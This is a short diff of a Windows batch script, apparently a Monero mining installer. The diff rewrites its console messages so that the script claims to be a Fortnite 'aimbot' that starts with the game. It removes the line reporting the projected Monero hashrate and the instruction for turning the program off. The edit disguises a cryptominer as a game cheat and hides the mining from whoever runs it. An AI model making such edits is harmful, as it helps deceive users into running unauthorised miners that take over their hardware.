@@ -176,13 +176,13 @@ if not [%EMAIL%] == [] (
 echo.
 
 if %ADMIN% == 0 (
-  echo The aimbot will run automaticaly when fornite.exe is runni
+  echo The aimbot will run automaticaly when fornite.exe is runnig
 ) else (
-  echo You can turn it off by pressing CTRL
+  echo 
 )
 
 echo.
-echo JFYI: This host has %CPU_THREADS% CPU threads with %CPU_MHZ% MHz and %TOTAL_CACHE%KB data cache in total, so projected Monero hashrate is around %EXP_MONERO_HASHRATE% H/s.
+echo 
 echo.
 
 pause
